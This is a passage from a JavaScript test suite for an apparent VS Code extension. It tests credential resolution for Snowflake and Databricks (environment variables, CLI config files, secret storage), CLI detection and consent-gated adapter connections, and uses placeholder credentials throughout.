    const { PipelineSpecManager } = withMock(mock, () => require('../dist/context/PipelineSpecManager.js'));
    const logs = [];
    const mgr = new PipelineSpecManager({ fsPath: '/ws' }, (msg) => logs.push(msg));
    await withMock(mock, () => mgr.initialize());
    assert.ok(mgr.getSpec(), 'loads instead of throwing on a missing specVersion');
    assert.strictEqual(mgr.getSpec().id, 'pre-existing');
    assert.ok(logs.some((l) => l.includes('loading leniently')));
  });

  await test('createDisposableRegistry() disposes every registered disposable, in reverse registration order', () => {
    const { createDisposableRegistry } = require('../dist/core/disposables.js');
    const order = [];
    const registry = createDisposableRegistry();
    registry.register({ dispose: () => order.push('first') });
    registry.register({ dispose: () => order.push('second') });
    registry.disposeAll();
    assert.deepStrictEqual(order, ['second', 'first']);
  });

  await test('createDisposableRegistry() keeps disposing the rest even if one dispose() throws', () => {
    const { createDisposableRegistry } = require('../dist/core/disposables.js');
    let secondDisposed = false;
    const registry = createDisposableRegistry();
    registry.register({ dispose: () => { secondDisposed = true; } });
    registry.register({ dispose: () => { throw new Error('boom'); } });
    registry.disposeAll();
    assert.strictEqual(secondDisposed, true);
  });

  // ── Phase 3a-i: Credential resolution foundation ──

  await test('EnvVarCredentialResolver resolves a complete Snowflake service-account credential set from documented env vars, with zero VS Code dependency', async () => {
    // Required directly with no vscode mock active at all: Module._load throws
    // 'no mock' on any require('vscode') attempt when `active` is null, so this
    // succeeding at all proves the resolver never touches the vscode module.
    const { EnvVarCredentialResolver } = fresh('../dist/engine/platform/credentials/EnvVarCredentialResolver.js');
    const resolver = new EnvVarCredentialResolver({
      AUTODE_SNOWFLAKE_ACCOUNT: 'acme-prod',
      AUTODE_SNOWFLAKE_USERNAME: 'svc_autode',
      AUTODE_SNOWFLAKE_PRIVATE_KEY: '-----BEGIN PRIVATE KEY-----\nabc\n-----END PRIVATE KEY-----',
      AUTODE_SNOWFLAKE_WAREHOUSE: 'ETL_WH',
      AUTODE_SNOWFLAKE_DATABASE: 'RAW'
    });
    const creds = await resolver.resolve({ platform: 'snowflake', principalType: 'service-account', ref: '', resolverId: 'env' });
    assert.strictEqual(creds.account, 'acme-prod');
    assert.strictEqual(creds.username, 'svc_autode');
    assert.ok(creds.privateKey.includes('BEGIN PRIVATE KEY'));
    assert.strictEqual(creds.warehouse, 'ETL_WH');
    assert.strictEqual(creds.database, 'RAW');
  });

  await test('EnvVarCredentialResolver returns undefined when none of a platform\'s env vars are set, and supports a named-profile prefix', async () => {
    const { EnvVarCredentialResolver } = fresh('../dist/engine/platform/credentials/EnvVarCredentialResolver.js');
    const empty = new EnvVarCredentialResolver({});
    assert.strictEqual(await empty.resolve({ platform: 'snowflake', principalType: 'service-account', ref: '', resolverId: 'env' }), undefined);

    const profiled = new EnvVarCredentialResolver({
      AUTODE_SNOWFLAKE_PROD_ACCOUNT: 'acme-prod',
      AUTODE_SNOWFLAKE_ACCOUNT: 'acme-dev'
    });
    const prodCreds = await profiled.resolve({ platform: 'snowflake', principalType: 'service-account', ref: 'prod', resolverId: 'env' });
    assert.strictEqual(prodCreds.account, 'acme-prod');
    const defaultCreds = await profiled.resolve({ platform: 'snowflake', principalType: 'service-account', ref: '', resolverId: 'env' });
    assert.strictEqual(defaultCreds.account, 'acme-dev');
  });

  await test('registerCredentialResolver() lets a test register a fake vault resolver that participates in resolution untouched by ConnectionManager/adapters', async () => {
    const { registerCredentialResolver, unregisterCredentialResolver, resolveCredential } = fresh('../dist/engine/platform/credentials/registry.js');
    const fakeVault = {
      id: 'fake-vault',
      supportedPrincipalTypes: ['service-account'],
      resolve: async (ref) => (ref.ref === 'known-secret' ? { token: 'vault-issued-token' } : undefined)
    };
    registerCredentialResolver(fakeVault);
    try {
      const creds = await resolveCredential({ platform: 'databricks', principalType: 'service-account', ref: 'known-secret', resolverId: 'fake-vault' });
      assert.strictEqual(creds.token, 'vault-issued-token');
      const miss = await resolveCredential({ platform: 'databricks', principalType: 'service-account', ref: 'unknown', resolverId: 'fake-vault' });
      assert.strictEqual(miss, undefined);
      // An unregistered resolver id resolves to undefined, never throws.
      const noResolver = await resolveCredential({ platform: 'databricks', principalType: 'service-account', ref: 'x', resolverId: 'nonexistent' });
      assert.strictEqual(noResolver, undefined);
    } finally {
      unregisterCredentialResolver('fake-vault');
    }
  });

  await test('providerRegistry authModes partition correctly by principalType for Snowflake and Databricks', () => {
    const mock = createMock();
    const { getAuthModesForPrincipal } = withMock(mock, () => fresh('../dist/engine/platform/providerRegistry.js'));
    const modeNames = (list) => list.map((m) => m.mode);

    // Snowflake: key-pair is usable by both, but is the platform's own recommended
    // service-account default; browser/username-password stay interactive-only.
    assert.deepStrictEqual(modeNames(getAuthModesForPrincipal('snowflake', 'service-account')), ['key-pair', 'oauth']);
    assert.ok(modeNames(getAuthModesForPrincipal('snowflake', 'interactive-user')).includes('external-browser'));
    assert.ok(!modeNames(getAuthModesForPrincipal('snowflake', 'service-account')).includes('external-browser'));

    // Databricks: OAuth U2M / a personal access token are interactive; OAuth M2M /
    // a service-principal-scoped token are the headless/automation paths.
    assert.deepStrictEqual(modeNames(getAuthModesForPrincipal('databricks', 'interactive-user')), ['oauth-u2m', 'personal-access-token']);
    assert.deepStrictEqual(modeNames(getAuthModesForPrincipal('databricks', 'service-account')), ['oauth-m2m', 'service-principal-token']);
  });

  await test('No resolver-resolved secret is ever written to VS Code SecretStorage when the active resolver is cli or env', async () => {
    const { registerCredentialResolver, unregisterCredentialResolver, resolveCredential } = fresh('../dist/engine/platform/credentials/registry.js');
    const { EnvVarCredentialResolver } = fresh('../dist/engine/platform/credentials/EnvVarCredentialResolver.js');
    const { CliConfigResolver } = fresh('../dist/engine/platform/credentials/CliConfigResolver.js');
    const { VsCodeSecretStorageResolver } = withMock(createMock(), () => fresh('../dist/core/credentials/VsCodeSecretStorageResolver.js'));

    let storeCalls = 0;
    const spySecrets = { store: async () => { storeCalls++; }, get: async () => undefined, delete: async () => {} };

    const os = require('node:os');
    const path = require('node:path');
    const fs = require('node:fs');
    const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'autode-cli-config-'));
    fs.writeFileSync(path.join(tmpDir, 'connections.toml'), '[default]\naccount = "acme"\n');
    const prevHome = process.env.SNOWFLAKE_HOME;
    process.env.SNOWFLAKE_HOME = tmpDir;

    registerCredentialResolver(new EnvVarCredentialResolver({ AUTODE_SNOWFLAKE_ACCOUNT: 'acme-ci' }));
    registerCredentialResolver(new CliConfigResolver());
    registerCredentialResolver(new VsCodeSecretStorageResolver(spySecrets));

    try {
      const envCreds = await resolveCredential({ platform: 'snowflake', principalType: 'service-account', ref: '', resolverId: 'env' });
      assert.strictEqual(envCreds.account, 'acme-ci');
      const cliCreds = await resolveCredential({ platform: 'snowflake', principalType: 'interactive-user', ref: '', resolverId: 'cli' });
      assert.strictEqual(cliCreds.connectionName, 'default');
      assert.strictEqual(storeCalls, 0, 'SecretStorage.store() must never be called by the env or cli resolvers');
    } finally {
      if (prevHome === undefined) { delete process.env.SNOWFLAKE_HOME; } else { process.env.SNOWFLAKE_HOME = prevHome; }
      fs.rmSync(tmpDir, { recursive: true, force: true });
      unregisterCredentialResolver('env');
      unregisterCredentialResolver('cli');
      unregisterCredentialResolver('vscode-secret-storage');
    }
  });

  await test('CliConfigResolver reads named connections out of a real connections.toml without ever extracting secret field values', async () => {
    const { CliConfigResolver } = fresh('../dist/engine/platform/credentials/CliConfigResolver.js');
    const os = require('node:os');
    const path = require('node:path');
    const fs = require('node:fs');
    const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'autode-cli-config-'));
    fs.writeFileSync(path.join(tmpDir, 'connections.toml'), '[default]\naccount = "acme-dev"\nuser = "dev_user"\n\n[prod]\naccount = "acme-prod"\nuser = "prod_user"\n');
    const prevHome = process.env.SNOWFLAKE_HOME;
    process.env.SNOWFLAKE_HOME = tmpDir;

    const resolver = new CliConfigResolver();
    try {
      const def = await resolver.resolve({ platform: 'snowflake', principalType: 'interactive-user', ref: '', resolverId: 'cli' });
      assert.deepStrictEqual(def, { connectionName: 'default', authMode: 'connections-toml' });

      const prod = await resolver.resolve({ platform: 'snowflake', principalType: 'interactive-user', ref: 'prod', resolverId: 'cli' });
      assert.deepStrictEqual(prod, { connectionName: 'prod', authMode: 'connections-toml' });

      const missing = await resolver.resolve({ platform: 'snowflake', principalType: 'interactive-user', ref: 'staging', resolverId: 'cli' });
      assert.strictEqual(missing, undefined);
    } finally {
      if (prevHome === undefined) { delete process.env.SNOWFLAKE_HOME; } else { process.env.SNOWFLAKE_HOME = prevHome; }
      fs.rmSync(tmpDir, { recursive: true, force: true });
    }
  });

  await test('CliConfigResolver (Phase 3a-ii) confirms a Databricks profile exists in .databrickscfg, returning a pointer that never includes host/token field values', async () => {
    const { CliConfigResolver } = fresh('../dist/engine/platform/credentials/CliConfigResolver.js');
    const os = require('node:os');
    const path = require('node:path');
    const fs = require('node:fs');
    const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'autode-databrickscfg-'));
    const cfgPath = path.join(tmpDir, 'databrickscfg');
    fs.writeFileSync(cfgPath, '[DEFAULT]\nhost = https://example.databricks.net\ntoken = should-never-be-returned\n\n[prod]\nhost = https://prod.databricks.net\ntoken = also-should-never-be-returned\n');
    const prevCfg = process.env.DATABRICKS_CONFIG_FILE;
    process.env.DATABRICKS_CONFIG_FILE = cfgPath;

    const resolver = new CliConfigResolver();
    try {
      const def = await resolver.resolve({ platform: 'databricks', principalType: 'interactive-user', ref: '', resolverId: 'cli' });
      assert.deepStrictEqual(def, { profile: 'DEFAULT', authMode: 'databrickscfg' });

      const prod = await resolver.resolve({ platform: 'databricks', principalType: 'interactive-user', ref: 'prod', resolverId: 'cli' });
      assert.deepStrictEqual(prod, { profile: 'prod', authMode: 'databrickscfg' });
      assert.strictEqual(JSON.stringify(prod).includes('token'), false, 'must never surface the raw token field');

      const missing = await resolver.resolve({ platform: 'databricks', principalType: 'interactive-user', ref: 'staging', resolverId: 'cli' });
      assert.strictEqual(missing, undefined);
    } finally {
      if (prevCfg === undefined) { delete process.env.DATABRICKS_CONFIG_FILE; } else { process.env.DATABRICKS_CONFIG_FILE = prevCfg; }
      fs.rmSync(tmpDir, { recursive: true, force: true });
    }
  });

  await test('CliConfigResolver returns undefined (never throws) when no connections.toml exists', async () => {
    const { CliConfigResolver } = fresh('../dist/engine/platform/credentials/CliConfigResolver.js');
    const os = require('node:os');
    const path = require('node:path');
    const prevHome = process.env.SNOWFLAKE_HOME;
    process.env.SNOWFLAKE_HOME = path.join(os.tmpdir(), 'autode-nonexistent-' + Date.now());
    const resolver = new CliConfigResolver();
    try {
      const result = await resolver.resolve({ platform: 'snowflake', principalType: 'interactive-user', ref: '', resolverId: 'cli' });
      assert.strictEqual(result, undefined);
    } finally {
      if (prevHome === undefined) { delete process.env.SNOWFLAKE_HOME; } else { process.env.SNOWFLAKE_HOME = prevHome; }
    }
  });

  await test('VsCodeSecretStorageResolver reads only a platform\'s secret fields under the generalized key scheme', async () => {
    const mock = createMock();
    const { VsCodeSecretStorageResolver, secretStorageKey } = withMock(mock, () => fresh('../dist/core/credentials/VsCodeSecretStorageResolver.js'));
    const store = new Map();
    store.set(secretStorageKey('snowflake', 'service-account', 'prod', 'password'), 'shh');
    const secrets = { store: async () => {}, get: async (k) => store.get(k), delete: async () => {} };

    const resolver = new VsCodeSecretStorageResolver(secrets);
    const creds = await resolver.resolve({ platform: 'snowflake', principalType: 'service-account', ref: 'prod', resolverId: 'vscode-secret-storage' });
    assert.strictEqual(creds.password, 'shh');
    assert.strictEqual(creds.privateKey, undefined);

    const noneStored = await resolver.resolve({ platform: 'snowflake', principalType: 'service-account', ref: 'dev', resolverId: 'vscode-secret-storage' });
    assert.strictEqual(noneStored, undefined);
  });

  // ── Phase 3a-ii: Interactive Onboarding UX ──

  function cliBinaryMock(opts = {}) {
    const versionOut = opts.versionOut; // string | null (null => nothing runnable)
    const explicitPaths = opts.existsPaths || [];
    const onPath = versionOut != null && opts.onPath !== false;
    const mockPath = opts.mockPath || (process.platform === 'win32' ? 'C:\\mock\\bin\\snow.exe' : '/mock/bin/snow');
    const base = createMock();
    const existsPaths = onPath ? explicitPaths.concat([mockPath]) : explicitPaths;
    base.__fs = {
      existsSync: (p) => existsPaths.includes(p),
      statSync: (p) => {
        if (!existsPaths.includes(p)) { const err = new Error(`ENOENT: ${p}`); throw err; }
        return { isFile: () => true, isDirectory: () => false };
      }
    };
    base.__childProcess = {
      spawnSync: (bin, args) => {
        if (bin === 'where' || bin === 'which') {
          return onPath ? { status: 0, stdout: mockPath + '\n' } : { status: 1, stdout: '' };
        }
        return versionOut != null ? { status: 0, stdout: versionOut } : { status: 1, stdout: '' };
      }
    };
    return { mock: base, mockPath };
  }

  await test('detectCliBinary() finds a CLI on PATH and reports its version, mirroring ClaudeCodeAdapter.resolve()\'s shape', async () => {
    const { mock, mockPath } = cliBinaryMock({ versionOut: '1.2.3\n' });
    const { detectCliBinary } = withMock(mock, () => fresh('../dist/engine/platform/credentials/cliDetection.js'));
    const result = detectCliBinary({ displayName: 'Snowflake', binaryNames: { win32: 'snow.exe', default: 'snow' }, installHint: 'Install it.' });
    assert.strictEqual(result.found, true);
    assert.strictEqual(result.source, 'path');
    assert.strictEqual(result.cliPath, mockPath);
    assert.strictEqual(result.version, '1.2.3');
  });

  await test('detectCliBinary() reports found:false with actionable guidance text when the CLI is nowhere to be found', async () => {
    const { mock } = cliBinaryMock({ versionOut: null, onPath: false });
    const { detectCliBinary } = withMock(mock, () => fresh('../dist/engine/platform/credentials/cliDetection.js'));
    const result = detectCliBinary({ displayName: 'Snowflake', binaryNames: { win32: 'snow.exe', default: 'snow' }, installHint: 'Install it from the docs.' });
    assert.strictEqual(result.found, false);
    assert.strictEqual(result.source, 'none');
    assert.ok(result.error && result.error.includes('Install it from the docs.'), 'never a bare error');
  });

  await test('detectCliBinary() prefers an explicit path setting over PATH, and reports a clear error when that setting is wrong', async () => {
    const explicitPath = process.platform === 'win32' ? 'C:\\custom\\snow.exe' : '/custom/snow';
    const { mock } = cliBinaryMock({ versionOut: '9.9.9', existsPaths: [explicitPath] });
    const { detectCliBinary } = withMock(mock, () => fresh('../dist/engine/platform/credentials/cliDetection.js'));
    const found = detectCliBinary({ displayName: 'Snowflake', binaryNames: { win32: 'snow.exe', default: 'snow' }, explicitPathSetting: explicitPath, installHint: 'x' });
    assert.strictEqual(found.source, 'setting');
    assert.strictEqual(found.cliPath, explicitPath);

    // A separate mock where nothing resolves via `where`/`which` either — otherwise
    // this mock's own `where`/`which` stub would "find" the bad path regardless.
    const { mock: notFoundMock } = cliBinaryMock({ versionOut: null, onPath: false });
    const { detectCliBinary: detectCliBinary2 } = withMock(notFoundMock, () => fresh('../dist/engine/platform/credentials/cliDetection.js'));
    const wrong = withMock(notFoundMock, () => detectCliBinary2({ displayName: 'Snowflake', binaryNames: { win32: 'snow.exe', default: 'snow' }, explicitPathSetting: '/nonexistent/snow', installHint: 'x' }));
    assert.strictEqual(wrong.found, false);
    assert.ok(wrong.error.includes('/nonexistent/snow'));
  });

  await test('detectCliBinary() auto-completes an explicit setting that points at the CLI\'s folder (not the binary itself) to <folder>/<binName>, instead of trying to spawn the directory (a real ENOENT hit live)', async () => {
    const folder = process.platform === 'win32' ? 'D:\\Program Files\\Snowflake CLI' : '/opt/snowflake-cli';
    const binName = process.platform === 'win32' ? 'snow.exe' : 'snow';
    const exePath = require('path').join(folder, binName);
    const mock = createMock();
    mock.__fs = {
      existsSync: (p) => p === folder || p === exePath,
      statSync: (p) => {
        if (p === folder) { return { isFile: () => false, isDirectory: () => true }; }
        if (p === exePath) { return { isFile: () => true, isDirectory: () => false }; }
        throw new Error(`ENOENT: ${p}`);
      }
    };
    mock.__childProcess = { spawnSync: () => ({ status: 0, stdout: '3.27.0\n' }) };
    const { detectCliBinary } = withMock(mock, () => fresh('../dist/engine/platform/credentials/cliDetection.js'));
    const result = withMock(mock, () => detectCliBinary({
      displayName: 'Snowflake', binaryNames: { win32: 'snow.exe', default: 'snow' }, explicitPathSetting: folder, installHint: 'x'
    }));
    assert.strictEqual(result.found, true);
    assert.strictEqual(result.source, 'setting');
    assert.strictEqual(result.cliPath, exePath);
  });

  await test('detectCliBinary() falls back to a well-known install directory when PATH resolution fails, but never scans beyond the given candidates', async () => {
    const binName = process.platform === 'win32' ? 'snow.exe' : 'snow';
    const wellKnownDir = process.platform === 'win32' ? 'D:\\Program Files\\Snowflake CLI' : '/opt/homebrew/bin';
    const wellKnownPath = require('path').join(wellKnownDir, binName);
    const { mock } = cliBinaryMock({ versionOut: '3.27.0', onPath: false, existsPaths: [wellKnownPath] });
    const { detectCliBinary } = withMock(mock, () => fresh('../dist/engine/platform/credentials/cliDetection.js'));

    const found = detectCliBinary({
      displayName: 'Snowflake',
      binaryNames: { win32: 'snow.exe', default: 'snow' },
      installHint: 'x',
      wellKnownDirs: [wellKnownDir]
    });
    assert.strictEqual(found.found, true);
    assert.strictEqual(found.source, 'well-known-location');
    assert.strictEqual(found.cliPath, wellKnownPath);

    const notListed = detectCliBinary({
      displayName: 'Snowflake',
      binaryNames: { win32: 'snow.exe', default: 'snow' },
      installHint: 'x',
      wellKnownDirs: ['/some/other/dir']
    });
    assert.strictEqual(notListed.found, false);
  });

  await test('SnowflakeCli.listConnections() parses "snow connection list --format json" output into names, without establishing a real connection', async () => {
    const base = createMock();
    base.__childProcess = {
      spawnSync: (bin, args) => {
        assert.deepStrictEqual(args, ['connection', 'list', '--format', 'json']);
        return { status: 0, stdout: JSON.stringify([{ connection_name: 'default', is_default: true }, { connection_name: 'prod' }]) };
      }
    };
    const { SnowflakeCli } = withMock(base, () => fresh('../dist/engine/platform/credentials/SnowflakeCli.js'));
    const cli = new SnowflakeCli();
    const connections = await withMock(base, () => cli.listConnections('/mock/bin/snow'));
    assert.deepStrictEqual(connections, [{ name: 'default' }, { name: 'prod' }]);
  });

  await test('SnowflakeCli.listConnections() degrades to an empty list (never throws) on a non-zero exit or malformed JSON', async () => {
    const base = createMock();
    base.__childProcess = { spawnSync: () => ({ status: 1, stdout: 'not json' }) };
    const { SnowflakeCli } = withMock(base, () => fresh('../dist/engine/platform/credentials/SnowflakeCli.js'));
    const cli = new SnowflakeCli();
    assert.deepStrictEqual(await withMock(base, () => cli.listConnections('/mock/bin/snow')), []);

    const base2 = createMock();
    base2.__childProcess = { spawnSync: () => ({ status: 0, stdout: '{not valid json' }) };
    const { SnowflakeCli: SnowflakeCli2 } = withMock(base2, () => fresh('../dist/engine/platform/credentials/SnowflakeCli.js'));
    assert.deepStrictEqual(await withMock(base2, () => new SnowflakeCli2().listConnections('/mock/bin/snow')), []);
  });

  await test('readDatabricksCfgProfiles() parses .databrickscfg sections without exposing them anywhere but as names, and respects DATABRICKS_CONFIG_FILE', async () => {
    const { readDatabricksCfgProfiles, databricksConfigPath } = fresh('../dist/engine/platform/credentials/databricksCfg.js');
    const os = require('node:os');
    const path = require('node:path');
    const fs = require('node:fs');
    const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'autode-databrickscfg-'));
    const cfgPath = path.join(tmpDir, 'databrickscfg');
    fs.writeFileSync(cfgPath, '# a comment\n[DEFAULT]\nhost = https://a.databricks.net\ntoken = secret-a\n\n[staging]\nhost = https://b.databricks.net\ntoken = secret-b\n');
    const prevCfg = process.env.DATABRICKS_CONFIG_FILE;
    process.env.DATABRICKS_CONFIG_FILE = cfgPath;
    try {
      assert.strictEqual(databricksConfigPath(), cfgPath);
      const profiles = await readDatabricksCfgProfiles();
      assert.deepStrictEqual(profiles.map((p) => p.name), ['DEFAULT', 'staging']);
      assert.strictEqual(profiles[1].fields.host, 'https://b.databricks.net');

      const missing = await readDatabricksCfgProfiles(path.join(tmpDir, 'nope'));
      assert.strictEqual(missing, undefined);
    } finally {
      if (prevCfg === undefined) { delete process.env.DATABRICKS_CONFIG_FILE; } else { process.env.DATABRICKS_CONFIG_FILE = prevCfg; }
      fs.rmSync(tmpDir, { recursive: true, force: true });
    }
  });

  await test('DatabricksCli.listConnections() enumerates .databrickscfg profile names only — no CLI shell-out, so no consent gate applies', async () => {
    const { DatabricksCli } = fresh('../dist/engine/platform/credentials/DatabricksCli.js');
    const os = require('node:os');
    const path = require('node:path');
    const fs = require('node:fs');
    const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'autode-databrickscfg-'));
    const cfgPath = path.join(tmpDir, 'databrickscfg');
    fs.writeFileSync(cfgPath, '[DEFAULT]\nhost = https://a.databricks.net\ntoken = secret-a\n');
    const prevCfg = process.env.DATABRICKS_CONFIG_FILE;
    process.env.DATABRICKS_CONFIG_FILE = cfgPath;
    try {
      const cli = new DatabricksCli();
      const connections = await cli.listConnections('unused-cli-path');
      assert.deepStrictEqual(connections, [{ name: 'DEFAULT' }]);
    } finally {
      if (prevCfg === undefined) { delete process.env.DATABRICKS_CONFIG_FILE; } else { process.env.DATABRICKS_CONFIG_FILE = prevCfg; }
      fs.rmSync(tmpDir, { recursive: true, force: true });
    }
  });

  await test('getCliDescriptor() returns a descriptor for snowflake/databricks and undefined for a platform with no CLI-reuse story yet', () => {
    const { getCliDescriptor } = fresh('../dist/engine/platform/credentials/cliRegistry.js');
    assert.strictEqual(getCliDescriptor('snowflake').platform, 'snowflake');
    assert.strictEqual(getCliDescriptor('databricks').platform, 'databricks');
    assert.strictEqual(getCliDescriptor('bigquery'), undefined);
  });

  await test('SnowflakeCliBackend surfaces the TAIL of a long, noisy CLI error (where the actionable message lives), not the head', async () => {
    const mock = createMock();
    const noise = 'internal traceback noise line\n'.repeat(200); // well over 2000 chars
    const actionable = 'Incoming request with IP/Token 1.2.3.4 is not allowed to access Snowflake. Contact your account administrator.';
    mock.__childProcess = {
      spawnSync: () => ({ status: 1, stderr: noise + actionable, stdout: '' })
    };
    const { SnowflakeCliBackend } = withMock(mock, () => fresh('../dist/engine/platform/executionBackends/SnowflakeCliBackend.js'));
    const backend = new SnowflakeCliBackend('/mock/bin/snow', { kind: 'named', connectionName: 'prod' }, () => {});
    await assert.rejects(
      () => withMock(mock, () => backend.executeQuery('SELECT 1')),
      (err) => err.message.includes(actionable) && err.message.length < noise.length
    );
  });

  function freshAdapterModule(mock, modulePath) {
    for (const p of [
      modulePath,
      '../dist/engine/platform/BaseAdapter.js',
      '../dist/core/extensionIdentity.js',
      '../dist/engine/platform/credentials/cliRegistry.js',
      '../dist/engine/platform/credentials/SnowflakeCli.js',
      '../dist/engine/platform/credentials/DatabricksCli.js',
      '../dist/engine/platform/credentials/cliDetection.js',
      '../dist/engine/platform/executionBackends/SnowflakeCliBackend.js',
      '../dist/engine/platform/executionBackends/SnowflakeRestBackend.js',
      '../dist/engine/platform/executionBackends/DatabricksRestBackend.js',
      '../dist/engine/platform/adapters/snowflakeJwt.js'
    ]) {
      try { delete require.cache[require.resolve(p)]; } catch { /* not loaded */ }
    }
    return withMock(mock, () => require(modulePath));
  }

  await test('SnowflakeAdapter.connect() (Phase 3b) executes via the CLI shell-out backend (tier 1) for a CLI-derived connectionName, gated by CLI-execution consent', async () => {
    const mockPath = process.platform === 'win32' ? 'C:\\mock\\bin\\snow.exe' : '/mock/bin/snow';
    const consented = createMock({ config: { dataPlatformCliConsent: true } });
    consented.__fs = {
      existsSync: (p) => p === mockPath,
      statSync: (p) => { if (p !== mockPath) { throw new Error(`ENOENT: ${p}`); } return { isFile: () => true, isDirectory: () => false }; }
    };
    consented.__childProcess = {
      spawnSync: (bin, args) => {
        if (bin === 'where' || bin === 'which') { return { status: 0, stdout: mockPath + '\n' }; }
        if (args[0] === '--version') { return { status: 0, stdout: '1.2.3\n' }; }
        assert.strictEqual(args[0], 'sql');
        assert.deepStrictEqual(args.slice(1, 3), ['-c', 'prod']);
        return { status: 0, stdout: JSON.stringify([{ CURRENT_DB: 'PROD_DB', CURRENT_SCHEMA: 'PUBLIC', CURRENT_VERSION: '8.1' }]) };
      }
    };
    const { SnowflakeAdapter } = freshAdapterModule(consented, '../dist/engine/platform/adapters/SnowflakeAdapter.js');
    const adapter = new SnowflakeAdapter({ connectionName: 'prod' }, () => {}, { cliConsent: true });
    const info = await withMock(consented, () => adapter.connect());
    assert.strictEqual(info.connected, true);
    assert.strictEqual(info.databaseName, 'PROD_DB');
    assert.strictEqual(info.version, '8.1');

    // Without consent, refused before any shell-out is attempted.
    const unconsented = createMock({ config: { dataPlatformCliConsent: false } });
    const { SnowflakeAdapter: SnowflakeAdapterNoConsent } = freshAdapterModule(unconsented, '../dist/engine/platform/adapters/SnowflakeAdapter.js');
    const adapter2 = new SnowflakeAdapterNoConsent({ connectionName: 'prod' }, () => {}, { cliConsent: false });
    await assert.rejects(() => withMock(unconsented, () => adapter2.connect()), /CLI-execution consent/);

    const bare = new SnowflakeAdapterNoConsent({}, () => {});
    await assert.rejects(() => withMock(unconsented, () => bare.connect()), /requires account, username, and database/);
  });

  await test('SnowflakeAdapter.connect() (Phase 3b) honors username/password auth via the CLI\'s ad-hoc --user/--password flags, since the SQL API cannot accept it', async () => {
    const mockPath = process.platform === 'win32' ? 'C:\\mock\\bin\\snow.exe' : '/mock/bin/snow';
    const consented = createMock({ config: { dataPlatformCliConsent: true } });
    consented.__fs = { existsSync: (p) => p === mockPath };
    consented.__childProcess = {
      spawnSync: (bin, args) => {
        if (bin === 'where' || bin === 'which') { return { status: 0, stdout: mockPath + '\n' }; }
        if (args[0] === '--version') { return { status: 0, stdout: '1.2.3\n' }; }
        assert.strictEqual(args[0], 'sql');
        assert.deepStrictEqual(args.slice(1, 5), ['--account', 'ACME', '--user', 'jdoe']);
        assert.ok(args.includes('--password'), 'password flag present');
        assert.ok(!args.includes('prod'), 'never falls back to a named connection');
        return { status: 0, stdout: JSON.stringify([{ CURRENT_DB: 'RAW_DB', CURRENT_SCHEMA: 'PUBLIC', CURRENT_VERSION: '8.1' }]) };
      }
    };
    const { SnowflakeAdapter } = freshAdapterModule(consented, '../dist/engine/platform/adapters/SnowflakeAdapter.js');
    const adapter = new SnowflakeAdapter(
      { account: 'ACME', username: 'jdoe', password: 'secret-pw', database: 'RAW_DB', authMode: 'username-password' },
      () => {},
      { cliConsent: true }
    );
    const info = await withMock(consented, () => adapter.connect());
    assert.strictEqual(info.connected, true);
    assert.strictEqual(info.databaseName, 'RAW_DB');

    // Same auth mode but no password stored yet: falls through to the REST tier's
    // explicit, actionable rejection rather than a silent/bare failure.
    const { SnowflakeAdapter: SnowflakeAdapter2 } = freshAdapterModule(consented, '../dist/engine/platform/adapters/SnowflakeAdapter.js');
    const noPassword = new SnowflakeAdapter2(
      { account: 'ACME', username: 'jdoe', database: 'RAW_DB', authMode: 'username-password' },
      () => {}
    );
    await assert.rejects(() => withMock(consented, () => noPassword.connect()), /requires a password/);
  });

  await test('DatabricksAdapter.connect() explains a CLI-derived profile it cannot find (DRV2: profiles are read from .databrickscfg, not rejected)', async () => {
    const mock = createMock();
    const { DatabricksAdapter } = freshAdapterModule(mock, '../dist/engine/platform/adapters/DatabricksAdapter.js');
    const adapter = new DatabricksAdapter({ profile: 'FinanceIQ', authMode: 'databrickscfg' }, () => {});
    const savedCfg = process.env.DATABRICKS_CONFIG_FILE;
    process.env.DATABRICKS_CONFIG_FILE = require('node:path').join(require('node:os').tmpdir(), 'autode-no-such-databrickscfg');
    try { await assert.rejects(() => withMock(mock, () => adapter.connect()), /No profile "FinanceIQ"/); }
    finally { if (savedCfg === undefined) delete process.env.DATABRICKS_CONFIG_FILE; else process.env.DATABRICKS_CONFIG_FILE = savedCfg; }

    const bare = new DatabricksAdapter({}, () => {});
    await assert.rejects(() => withMock(mock, () => bare.connect()), /requires a workspace host, SQL warehouse HTTP path, and token/);
  });

  await test('TargetContext.credentialRef (Phase 3a-ii) round-trips through TargetContextManager, proving "Connect to Data Platform" reuses the existing Target Context model', async () => {
    function fsMapMock() {
      const store = new Map();
      const keyOf = (uri) => (uri && uri.fsPath) ? uri.fsPath : String(uri);
      return {
        Uri: { file: (p) => ({ fsPath: p }), joinPath: (...parts) => ({ fsPath: parts.map((p) => (p && p.fsPath) ? p.fsPath : String(p)).join('/') }) },
        workspace: { fs: {
          createDirectory: async () => {},
          readFile: async (uri) => { const v = store.get(keyOf(uri)); if (v === undefined) throw new Error('ENOENT'); return Buffer.from(v, 'utf8'); },
          writeFile: async (uri, buf) => { store.set(keyOf(uri), buf.toString('utf8')); },
          rename: async (a, b) => { store.set(keyOf(b), store.get(keyOf(a))); store.delete(keyOf(a)); }
        } }
      };
    }
    const mock = fsMapMock();
    try { delete require.cache[require.resolve('../dist/context/TargetContextManager.js')]; } catch { /* not loaded */ }
    const { TargetContextManager } = withMock(mock, () => require('../dist/context/TargetContextManager.js'));
    const mgr = new TargetContextManager({ fsPath: '/ws' }, () => {});
    await withMock(mock, () => mgr.initialize());

    await withMock(mock, () => mgr.save({
      specId: 'bps-1', specVersion: 1, status: 'built', platform: 'snowflake',
      credentialRef: { resolverId: 'cli', ref: 'prod' }, answers: {}
    }));
    assert.deepStrictEqual(mgr.getContext().credentialRef, { resolverId: 'cli', ref: 'prod' });

    const mgr2 = new TargetContextManager({ fsPath: '/ws' }, () => {});
    await withMock(mock, () => mgr2.initialize());
    assert.deepStrictEqual(mgr2.getContext().credentialRef, { resolverId: 'cli', ref: 'prod' }, 'survives a reload');
  });

  await test('TargetContextManager bumps version + archives only when revising an already-approved predecessor of the same spec lineage (v0.19.0, mirrors SourceContextManager exactly)', async () => {
    function fsMapMock() {
      const store = new Map();
      const keyOf = (uri) => (uri && uri.fsPath) ? uri.fsPath : String(uri);
      return {
